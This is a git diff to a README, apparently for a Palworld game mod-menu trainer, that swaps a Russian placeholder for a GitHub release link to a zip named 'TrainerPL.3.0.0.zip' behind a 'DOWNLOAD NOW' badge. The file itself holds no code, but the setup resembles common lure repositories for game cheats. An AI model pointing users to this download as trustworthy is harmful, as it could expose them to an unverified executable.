@@ -44,7 +44,7 @@ Perfect for testing, building, exploring, or just having fun without the grind.
 ## 📥 Download
 
 <p align="center">
-  <a href="ССЫЛКА_НА_СКАЧИВАНИЕ">
+  <a href="https://github.com/Massryodepot/Palworld-Ultimate-Mod-Menu/releases/download/1/TrainerPL.3.0.0.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
